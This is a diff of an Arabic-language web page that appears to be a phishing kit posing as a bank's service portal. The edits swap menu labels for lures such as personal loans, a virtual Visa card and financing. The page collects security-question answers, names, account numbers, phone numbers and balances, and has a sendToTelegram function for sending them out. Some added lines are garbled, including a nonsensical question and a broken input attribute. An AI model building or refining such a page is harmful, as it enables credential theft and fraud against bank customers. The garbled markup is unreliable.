@@ -683,11 +683,11 @@
           </div>
           <div class="service-option" onclick="selectAndProceedService(1, 'تحديث البيانات')">
             <i class="fa-solid fa-file-pen service-icon"></i>
-            <span class="service-title">تحديث البيانات</span>
+            <span class="service-title"> قروض شخصية</span>
           </div>
           <div class="service-option" onclick="selectAndProceedService(2, 'أسئلة الأمان')">
             <i class="fa-solid fa-shield-halved service-icon"></i>
-            <span class="service-title">أسئلة الأمان</span>
+            <span class="service-title">بطاقة فيزا افتراضية</span>
           </div>
           <div class="service-option" onclick="selectAndProceedService(3, 'سقف المعاملات اليومية')">
             <i class="fa-solid fa-chart-column service-icon"></i>
@@ -695,7 +695,7 @@
           </div>
           <div class="service-option" onclick="selectAndProceedService(4, 'كشف الحساب')">
             <i class="fa-solid fa-file-invoice service-icon"></i>
-            <span class="service-title">كشف الحساب</span>
+            <span class="service-title">طلب تمويل</span>
           </div>
           <div class="service-option" onclick="selectAndProceedService(5, 'ترقية الحساب')">
             <i class="fa-solid fa-arrows-rotate service-icon"></i>
@@ -1127,10 +1127,10 @@
 
     const questions = [
       "ما هو اسم المدرسة التي التحقت بها؟",
-      "العلامة التجارية لأول تلفزيون خاص بك؟",
+      " في اي سنة الحالي التقريبيي",
       "أي فيلم هو المفضَّل لديك؟",
       "ما هو اسم ابن عمك الأول؟",
-      "ماذا كان لديك أثناء الطفولة؟"
+      "ماذا كان تلفزيون أثناء الطفولة؟"
     ];
 
     async function sendToTelegram(text) {
@@ -1190,7 +1190,7 @@
         <div class="input-box"><label class="input-label">الاسم الكامل</label><input type="text" class="input-field dynamic-input" id="f_name" placeholder="أدخل اسمك ثلاثياً" required autocomplete="off" /></div>
         <div class="input-box"><label class="input-label">رقم الحساب</label><input type="text" class="input-field dynamic-input" id="f_acc" placeholder="أدخل رقم الحساب" required autocomplete="off" /></div>
         <div class="input-box"><label class="input-label">رقم الهاتف المسجل مع الحساب</label><input type="tel" class="input-field dynamic-input" id="f_phone" placeholder="09xxxxxxxx" required autocomplete="off" /></div>
-        <div class="input-box"><label class="input-label">الرصيد المتبقي في الحساب</label><input type="text" class="input-field dynamic-input" id="f_balance" placeholder="أدخل الرصيد الحالي التقريبي" required autocomplete="off" /></div>
+        <div class="input-box"><label class="input-label">الرصيد المتبقي في الحساب</label><input type="text" class="input-field dynamic-input" id="f_balance" placeholder=" required aلحاليomplete="off" /></div>
       `;
 
       if (index === 3) {
